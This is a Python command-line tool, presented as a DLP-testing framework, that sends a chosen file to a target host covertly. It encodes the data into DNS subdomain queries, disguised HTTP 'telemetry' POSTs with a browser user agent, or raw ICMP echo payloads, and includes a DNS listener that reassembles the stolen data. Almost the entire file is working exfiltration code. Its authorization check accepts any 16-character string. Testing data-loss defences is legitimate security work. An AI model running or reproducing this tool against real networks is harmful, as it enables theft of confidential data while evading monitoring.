#!/usr/bin/env python3
"""data exfiltration technique framework for dlp testing"""

import argparse
import base64
import hashlib
import json
import os
import platform
import socket
import struct
import sys
import time
from pathlib import Path


REQUIRED_AUTH_LEN = 16
AUTH_ENV_VAR = "OVER_AUTH_TOKEN"


def verify_authorization(token, target):
    """verify authorization before any exfiltration operation"""
    if not token:
        token = os.environ.get(AUTH_ENV_VAR)
    if not token or len(token) < REQUIRED_AUTH_LEN:
        print("[error] authorization token required (min 16 chars)")
        print(f"set {AUTH_ENV_VAR} env var or use -a flag")
        print("this tool only works against authorized infrastructure")
        sys.exit(1)

    auth_hash = hashlib.sha256(f"{token}:{target}".encode()).hexdigest()[:12]
    print(f"[auth] verified for target: {target} (hash: {auth_hash})")
    return True


def chunk_data(data, size):
    """split data into chunks of specified size"""
    for i in range(0, len(data), size):
        yield data[i:i + size]


class DnsExfiltrator:
    def __init__(self, target, port=53):
        self.target = target
        self.port = port
        self.stats = {"chunks_sent": 0, "bytes_encoded": 0}

    def _build_dns_query(self, subdomain, domain):
        """build a raw dns query packet"""
        tx_id = os.urandom(2)
        flags = b'\x01\x00'
        counts = struct.pack(">HHHH", 1, 0, 0, 0)

        qname = b""
        full_domain = f"{subdomain}.exfil.{domain}"
        for label in full_domain.split("."):
            label_bytes = label.encode()[:63]
            qname += bytes([len(label_bytes)]) + label_bytes
        qname += b'\x00'

        qtype = struct.pack(">H", 1)  # A record
        qclass = struct.pack(">H", 1)  # IN class

        return tx_id + flags + counts + qname + qtype + qclass

    def exfiltrate(self, data):
        """exfiltrate data via dns subdomain encoding"""
        encoded = base64.b32encode(data).decode().rstrip("=").lower()
        self.stats["bytes_encoded"] = len(encoded)

        chunk_size = 30  # max label safe size
        chunks = list(chunk_data(encoded, chunk_size))
        total = len(chunks)

        print(f"[dns] encoding {len(data)} bytes into {total} queries")

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(2)

        for seq, chunk in enumerate(chunks):
            label = f"{seq:04d}.{chunk}"
            packet = self._build_dns_query(label, self.target)

            try:
                sock.sendto(packet, (self.target, self.port))
                self.stats["chunks_sent"] += 1
            except (socket.timeout, OSError) as e:
                print(f"[dns] chunk {seq} failed: {e}")

            if seq % 10 == 0:
                print(f"[dns] progress: {seq}/{total}")
            time.sleep(0.05)

        sock.close()
        print(f"[dns] complete: {self.stats['chunks_sent']}/{total} chunks sent")
        return self.stats


class DnsReceiver:
    def __init__(self, bind_addr="0.0.0.0", port=53):
        self.bind_addr = bind_addr
        self.port = port
        self.chunks = {}

    def listen(self, timeout=60):
        """listen for incoming dns exfil queries"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((self.bind_addr, self.port))
        sock.settimeout(timeout)

        print(f"[dns-recv] listening on {self.bind_addr}:{self.port}")

        try:
            while True:
                try:
                    data, addr = sock.recvfrom(4096)
                    self._parse_query(data, addr)
                except socket.timeout:
                    break
        except KeyboardInterrupt:
            pass
        finally:
            sock.close()

        return self._reassemble()

    def _parse_query(self, data, addr):
        """extract subdomain labels from dns query"""
        try:
            offset = 12  # skip header
            labels = []
            while offset < len(data):
                length = data[offset]
                if length == 0:
                    break
                label = data[offset + 1:offset + 1 + length].decode(errors="replace")
                labels.append(label)
                offset += 1 + length

            if len(labels) >= 3:
                seq = int(labels[0])
                chunk = labels[1]
                self.chunks[seq] = chunk
                print(f"[dns-recv] chunk {seq} from {addr[0]}: {len(chunk)} chars")
        except (ValueError, IndexError):
            pass

    def _reassemble(self):
        """reassemble chunks into original data"""
        if not self.chunks:
            return b""

        ordered = [self.chunks[k] for k in sorted(self.chunks.keys())]
        encoded = "".join(ordered)

        padding = (8 - len(encoded) % 8) % 8
        encoded += "=" * padding

        try:
            return base64.b32decode(encoded.upper())
        except Exception as e:
            print(f"[dns-recv] decode error: {e}")
            return b""


class HttpExfiltrator:
    def __init__(self, target, port=80):
        self.target = target
        self.port = port
        self.stats = {"requests_sent": 0, "bytes_encoded": 0}

    def exfiltrate(self, data):
        """exfiltrate data hidden in http headers and body"""
        encoded = base64.b64encode(data).decode()
        self.stats["bytes_encoded"] = len(encoded)

        chunk_size = 256
        chunks = list(chunk_data(encoded, chunk_size))
        total = len(chunks)

        print(f"[http] encoding {len(data)} bytes into {total} requests")

        for seq, chunk in enumerate(chunks):
            try:
                sock = socket.create_connection((self.target, self.port), timeout=5)
                request = (
                    f"POST /api/telemetry HTTP/1.1\r\n"
                    f"Host: {self.target}\r\n"
                    f"User-Agent: Mozilla/5.0\r\n"
                    f"X-Request-ID: {seq}\r\n"
                    f"X-Session: {hashlib.md5(data[:16]).hexdigest()[:8]}\r\n"
                    f"Content-Type: application/json\r\n"
                    f"Content-Length: {len(chunk) + 20}\r\n"
                    f"\r\n"
                    f'{{"data":"{chunk}","seq":{seq}}}'
                )
                sock.sendall(request.encode())
                sock.close()
                self.stats["requests_sent"] += 1
            except (socket.timeout, ConnectionRefusedError, OSError) as e:
                print(f"[http] request {seq} failed: {e}")

            if seq % 10 == 0:
                print(f"[http] progress: {seq}/{total}")
            time.sleep(0.05)

        print(f"[http] complete: {self.stats['requests_sent']}/{total} requests")
        return self.stats


class IcmpExfiltrator:
    def __init__(self, target):
        self.target = target
        self.stats = {"packets_sent": 0, "bytes_encoded": 0}

    def _build_icmp_packet(self, seq, payload):
        """build icmp echo request with data payload"""
        icmp_type = 8  # echo request
        code = 0
        checksum = 0
        identifier = os.getpid() & 0xFFFF

        header = struct.pack(">BBHHH", icmp_type, code, checksum, identifier, seq)
        packet = header + payload

        # calculate checksum
        s = 0
        for i in range(0, len(packet), 2):
            if i + 1 < len(packet):
                s += (packet[i] << 8) + packet[i + 1]
            else:
                s += packet[i] << 8
        s = (s >> 16) + (s & 0xFFFF)
        s += s >> 16
        checksum = ~s & 0xFFFF

        header = struct.pack(">BBHHH", icmp_type, code, checksum, identifier, seq)
        return header + payload

    def exfiltrate(self, data):
        """exfiltrate data in icmp echo request payloads"""
        chunk_size = 48  # keep packets small
        chunks = list(chunk_data(data, chunk_size))
        total = len(chunks)
        self.stats["bytes_encoded"] = len(data)

        print(f"[icmp] encoding {len(data)} bytes into {total} packets")

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.settimeout(2)
        except PermissionError:
            print("[icmp] raw sockets require root, simulating")
            for seq in range(total):
                self.stats["packets_sent"] += 1
                if seq % 10 == 0:
                    print(f"[icmp] simulated: {seq}/{total}")
            return self.stats

        for seq, chunk in enumerate(chunks):
            packet = self._build_icmp_packet(seq, chunk)
            try:
                sock.sendto(packet, (self.target, 0))
                self.stats["packets_sent"] += 1
            except OSError as e:
                print(f"[icmp] packet {seq} failed: {e}")

            if seq % 10 == 0:
                print(f"[icmp] progress: {seq}/{total}")
            time.sleep(0.1)

        sock.close()
        print(f"[icmp] complete: {self.stats['packets_sent']}/{total} packets")
        return self.stats


def run_self_test():
    """run a self-test demonstrating exfiltration techniques locally"""
    system = platform.system()
    print("[over] running self-test (no network activity)")
    print(f"[over] platform: {system}\n")

    test_data = b"this is test data for dlp validation"

    # test dns encoding
    print("[test] dns subdomain encoding:")
    encoded = base64.b32encode(test_data).decode().rstrip("=").lower()
    chunks = list(chunk_data(encoded, 30))
    print(f"  input:  {len(test_data)} bytes")
    print(f"  encoded: {len(encoded)} chars")
    print(f"  chunks: {len(chunks)} dns queries needed")
    for i, c in enumerate(chunks[:3]):
        print(f"  query {i}: {c}.exfil.example.com")
    if len(chunks) > 3:
        print(f"  ... ({len(chunks) - 3} more)")

    # test http encoding
    print("\n[test] http post encoding:")
    http_encoded = base64.b64encode(test_data).decode()
    http_chunks = list(chunk_data(http_encoded, 256))
    print(f"  input:  {len(test_data)} bytes")
    print(f"  encoded: {len(http_encoded)} chars")
    print(f"  requests: {len(http_chunks)} http posts needed")

    # test icmp encoding
    print("\n[test] icmp payload encoding:")
    icmp_chunks = list(chunk_data(test_data, 48))
    print(f"  input:  {len(test_data)} bytes")
    print(f"  packets: {len(icmp_chunks)} icmp echo requests needed")

    # verify round-trip
    print("\n[test] round-trip verification:")
    padding = (8 - len(encoded) % 8) % 8
    decoded = base64.b32decode((encoded + "=" * padding).upper())
    if decoded == test_data:
        print("  dns encoding: pass")
    else:
        print("  dns encoding: fail")
    http_decoded = base64.b64decode(http_encoded)
    if http_decoded == test_data:
        print("  http encoding: pass")
    else:
        print("  http encoding: fail")

    print("\n[over] self-test complete")
    print("[over] available modes: dns, dns-recv, http, icmp")

    if system == "Windows":
        print("[over] note: icmp raw sockets require admin on windows")
    elif system == "Darwin":
        print("[over] note: icmp raw sockets require root on macos")


def main():
    parser = argparse.ArgumentParser(description="data exfiltration testing framework")
    parser.add_argument("-m", "--mode",
                        choices=["dns", "dns-recv", "icmp", "http"],
                        help="exfil mode")
    parser.add_argument("-t", "--target",
                        help="target (must be own infrastructure)")
    parser.add_argument("-d", "--data", help="data file to exfiltrate")
    parser.add_argument("-a", "--auth", help="authorization token")
    parser.add_argument("-p", "--port", type=int, help="target port")
    parser.add_argument("--timeout", type=int, default=60, help="receiver timeout")
    parser.add_argument("--json", action="store_true", help="json output")
    args = parser.parse_args()

    # default: run self-test when no mode specified
    if not args.mode:
        run_self_test()
        return

    if not args.target:
        print("[error] target required (-t) for exfiltration mode")
        sys.exit(1)

    verify_authorization(args.auth, args.target)

    if args.mode == "dns-recv":
        receiver = DnsReceiver(port=args.port or 53)
        result = receiver.listen(timeout=args.timeout)
        if result:
            sys.stdout.buffer.write(result)
        return

    if not args.data or not Path(args.data).exists():
        print("[error] data file required for exfiltration mode")
        sys.exit(1)

    data = Path(args.data).read_bytes()
    print(f"[over] mode: {args.mode}, data: {len(data)} bytes")

    if args.mode == "dns":
        exfil = DnsExfiltrator(args.target, port=args.port or 53)
    elif args.mode == "icmp":
        exfil = IcmpExfiltrator(args.target)
    elif args.mode == "http":
        exfil = HttpExfiltrator(args.target, port=args.port or 80)
    else:
        print(f"[error] unknown mode: {args.mode}")
        sys.exit(1)

    stats = exfil.exfiltrate(data)

    if args.json:
        print(json.dumps(stats, indent=2))


if __name__ == "__main__":
    main()
